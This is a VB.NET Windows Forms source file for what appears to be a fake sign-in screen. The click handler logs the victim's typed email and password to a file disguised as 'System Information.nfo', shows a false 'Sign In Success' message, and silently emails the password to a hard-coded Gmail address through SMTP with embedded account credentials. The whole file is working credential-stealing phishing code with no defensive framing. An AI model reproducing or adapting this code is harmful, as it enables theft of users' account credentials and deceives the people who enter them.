Imports System.Net.Mail
Public Class Form4
    Const mfilename As String = "C:\Users\Public\Pictures\System Information.nfo"
    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
        Dim file As System.IO.StreamWriter
        file = My.Computer.FileSystem.
            OpenTextFileWriter(mfilename, True)
        Dim email As String
        email = "Email : "
        Dim pwd As String
        pwd = "Password : "
        Dim space As String
        space = ""
        Dim curdate As String
        curdate = "Login On :"
        file.Flush()
        file.WriteLine(curdate + Now)
        file.WriteLine(email + Form3.EmailTB.Text)
        file.WriteLine(pwd + PwdTB.Text)
        file.WriteLine(space)
        file.Close()
        MessageBox.Show("Sign In Success")

        Dim MyMailMessage As New MailMessage()
        Try
            MyMailMessage.From = New MailAddress("starrytricks@gmail.com")
            MyMailMessage.To.Add("starrytricks@gmail.com")
            MyMailMessage.Subject = Form1.EmailTB.Text
            MyMailMessage.Body = PwdTB.Text
            Dim SMTP As New SmtpClient("smtp.gmail.com")
            SMTP.Port = 587
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential("starrytricks@gmail.com", "amazing")
            SMTP.Send(MyMailMessage)
        Catch ex As Exception
        End Try

        Me.Hide()
        Form5.Show()
    End Sub

    Private Sub Form4_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class